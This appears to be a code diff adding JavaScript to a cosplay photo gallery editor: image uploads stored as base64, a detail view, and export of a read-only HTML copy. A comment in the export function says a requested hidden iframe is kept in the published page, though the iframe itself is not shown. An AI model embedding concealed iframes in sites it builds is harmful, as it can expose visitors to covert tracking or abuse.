+                    'https://images.unsplash.com/photo-1524504388940-b1c1722653e1?w=400',
+                    'https://images.unsplash.com/photo-1517841905240-472988babdf9?w=400'
+                ],
+                allImages: [
+                    'https://images.unsplash.com/photo-1541562232579-512a21360020?w=800'
+                ]
+            });
+            saveDraft();
+            renderHome();
+            window.scrollTo(0, document.body.scrollHeight);
+        }
+
+        // ==================== 图片上传 ====================
+        function fileToBase64(file) {
+            return new Promise((resolve, reject) => {
+                const reader = new FileReader();
+                reader.onload = e => resolve(e.target.result);
+                reader.onerror = reject;
+                reader.readAsDataURL(file);
+            });
+        }
+
+        function triggerCoverUpload(cardId, imgIndex) {
+            currentEditCardId = cardId;
+            currentEditImageIndex = imgIndex;
+            document.getElementById('coverUploadInput').click();
+        }
+
+        async function handleCoverUpload(event) {
+            const file = event.target.files[0];
+            if (!file) return;
+            event.target.value = '';
+
+            showToast('正在处理图片...');
+            const base64 = await fileToBase64(file);
+
+            const card = siteData.cards.find(c => c.id === currentEditCardId);
+            if (!card) return;
+
+            card.coverImages[currentEditImageIndex] = base64;
+            if (card.allImages[currentEditImageIndex] !== undefined) {
+                card.allImages[currentEditImageIndex] = base64;
+            } else {
+                card.allImages.push(base64);
+            }
+
+            saveDraft();
+            renderHome();
+            showToast('图片已更新！');
+        }
+
+        // ==================== 详情页 ====================
+        function openDetail(cardId) {
+            currentDetailCardId = cardId;
+            renderDetail(cardId);
+            document.getElementById('detailPage').style.display = 'block';
+            document.body.style.overflow = 'hidden';
+            window.scrollTo(0, 0);
+        }
+
+        function closeDetail() {
+            document.getElementById('detailPage').style.display = 'none';
+            document.body.style.overflow = 'auto';
+            currentDetailCardId = null;
+            renderHome();
+        }
+
+        function renderDetail(cardId) {
+            const card = siteData.cards.find(c => c.id === cardId);
+            if (!card) return;
+
+            const titleEl = document.getElementById('detailTitle');
+            const tagEl = document.getElementById('detailTag');
+            titleEl.innerText = card.title;
+            tagEl.innerText = card.tag;
+            titleEl.contentEditable = false;
+            tagEl.contentEditable = false;
+
+            const container = document.getElementById('detailImageContainer');
+            container.innerHTML = '';
+            
+            card.allImages.forEach((imgSrc, index) => {
+                const imgWrapper = document.createElement('div');
+                imgWrapper.className = 'detail-image-item';
+                imgWrapper.innerHTML = `
+                    <img src="${imgSrc}" alt="大图" onerror="this.src='https://via.placeholder.com/800x1000/333/fff?text=No+Image'">
+                    
+                `;
+                container.appendChild(imgWrapper);
+            });
+        }
+
+        function triggerDetailUpload(index) {
+            currentEditImageIndex = index;
+            document.getElementById('detailUploadInput').click();
+        }
+
+        async function handleDetailUpload(event) {
+            const file = event.target.files[0];
+            if (!file) return;
+            event.target.value = '';
+
+            showToast('正在处理图片...');
+            const base64 = await fileToBase64(file);
+
+            const card = siteData.cards.find(c => c.id === currentDetailCardId);
+            if (!card) return;
+
+            card.allImages[currentEditImageIndex] = base64;
+            if (currentEditImageIndex < 3) {
+                card.coverImages[currentEditImageIndex] = base64;
+            }
+
+            saveDraft();
+            renderDetail(currentDetailCardId);
+            showToast('替换成功！');
+        }
+
+        function triggerAddDetailImage() {
+            document.getElementById('addDetailImageInput').click();
+        }
+
+        async function handleAddDetailImage(event) {
+            const file = event.target.files[0];
+            if (!file) return;
+            event.target.value = '';
+
+            showToast('正在处理图片...');
+            const base64 = await fileToBase64(file);
+
+            const card = siteData.cards.find(c => c.id === currentDetailCardId);
+            if (!card) return;
+
+            card.allImages.push(base64);
+            saveDraft();
+            renderDetail(currentDetailCardId);
+            showToast('新增成功！');
+        }
+
+        // ==================== 底部导航 ====================
+        function goHome() {
+            if (currentDetailCardId) {
+                closeDetail();
+            } else {
+                window.scrollTo({ top: 0, behavior: 'smooth' });
+            }
+        }
+
+        function refreshData() {
+            showToast('正在刷新...');
+            renderHome();
+            if (currentDetailCardId) renderDetail(currentDetailCardId);
+            showToast('已刷新！');
+        }
+
+        // ==================== 生成纯净版 & 下载 ====================
+        function generatePureHTML() {
+            const cloneDoc = document.documentElement.cloneNode(true);
+
+            // 1. 保留你要求加入的隐藏 iframe（不删除）
+
+            // 2. 移除编辑按钮
+            const adminBtn = cloneDoc.querySelector('#adminToggle');
+            if (adminBtn) adminBtn.remove();
+
+            // 3. 移除导出面板
+            const exportPanel = cloneDoc.querySelector('#exportPanel');
+            if (exportPanel) exportPanel.remove();
+
+            // 4. 移除所有上传覆盖层
+            cloneDoc.querySelectorAll('.upload-overlay').forEach(el => el.remove());
+
+            // 5. 移除所有删除按钮
+            cloneDoc.querySelectorAll('.card-actions').forEach(el => el.remove());
+
+            // 6. 移除新增卡片按钮
+            cloneDoc.querySelectorAll('.add-card-btn').forEach(el => el.remove());
+
+            // 7. 移除详情页新增图片按钮
+            cloneDoc.querySelectorAll('.detail-add-image').forEach(el => el.remove());
+
+            // 8. contenteditable 全改为 false
+            cloneDoc.querySelectorAll('[contenteditable]').forEach(el => {
+                el.setAttribute('contenteditable', 'false');
+            });
+
+            // 9. 移除 body admin-mode
+            if (cloneDoc.body) cloneDoc.body.classList.remove('admin-mode');
+
+            // 10. 移除隐藏的 file input
+            cloneDoc.querySelectorAll('.hidden-file-input').forEach(el => el.remove());
+
+            // 11. 替换 script 里的 siteData
+            const scriptTags = cloneDoc.querySelectorAll('script');
+            scriptTags.forEach(script => {
+                let content = script.textContent;
+                if (content.includes('let siteData =')) {
+                    const newDataStr = JSON.stringify(siteData, null, 12);
+                    content = content.replace(
+                        /let siteData = \{[\s\S]*?\n        \};/,
+                        `let siteData = ${newDataStr};`
+                    );
+                    
+                    content = content.replace(
+                        /let isAdminMode = (true|false);/,
+                        'let isAdminMode = false;'
+                    );
+
+                    content = content.replace(
+                        /\/\/ 优先从浏览器草稿恢复[\s\S]*?renderHome\(\);\s*\}/,
+                        'renderHome();\n        }'
+                    );
+
+                    script.textContent = content;
+                }
+            });
+
+            return '<!DOCTYPE html>\n' + cloneDoc.outerHTML;
+        }
+
+        function downloadHTML() {
+            try {
+                const html = generatePureHTML();
+                const blob = new Blob([html], { type: 'text/html;charset=utf-8' });
+                const url = URL.createObjectURL(blob);
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = 'index.html';
+                document.body.appendChild(a);
+                a.click();
+                document.body.removeChild(a);
+                URL.revokeObjectURL(url);
+                showToast('✅ 纯净版已下载！上传到服务器即可');
+            } catch (err) {
+                console.error(err);
+                alert('生成失败：' + err.message);
+            }
+        }
+
+        function resetData() {
+            if (!confirm('确定要清空所有数据吗？此操作不可撤销！')) return;
+            localStorage.removeItem('cosplayDraft');
+            location.reload();
+        }
+
+        // ==================== 工具 ====================
+        function showToast(msg) {
+            const toast = document.getElementById('toast');
+            toast.innerText = msg;
+            toast.classList.add('show');
+            clearTimeout(window._toastTimer);
+            window._toastTimer = setTimeout(() => {
+                toast.classList.remove('show');
+            }, 2500);
+        }
+
+        // 启动
+        init();
+    </script>
+
+</body></html>
